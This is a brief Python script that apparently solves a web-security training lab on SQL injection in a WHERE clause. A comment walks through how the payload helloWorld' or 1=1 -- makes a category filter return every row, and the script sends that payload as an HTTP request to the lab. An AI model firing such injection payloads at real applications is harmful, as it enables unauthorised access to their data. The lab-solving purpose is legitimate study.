import requests as r


# lab name:SQL injection vulnerability in WHERE clause allowing retrieval of hidden data


link = "" # lab link without the last backslash \

'''
 goal is to retrieve information about all the categories
 ex : 
  /filter?category=Food & Drink

We can make the following hypothesis : 
 the query look like  :  select * from ... where category ='Food & Dring' and ...

If there isn't any user input sanitization we can : 

transform modify the query with our own one : 

/filter?category=helloWorld' or 1=1 --

which in an sql query look like :  

    select *  from ... where category='helloWorld' or 1=1 -- ' and ..

first comparison : category='helloWorld'

since the category helloWorld doesnt exist, the next comparison will be evaluated: 

second comparison : 1=1

1=1 is always true so the previous sql query will be in reality similair to this one : 

    select * from ... where 1=1  


'''
vulnerable_loc="/filter?category="

payload="helloWorld\' or 1=1 --" # we need to add backslash before ' because we want it to be part of the string

print(link+vulnerable_loc + payload)
my_req = r.get(link+vulnerable_loc + payload)


print(my_req.text)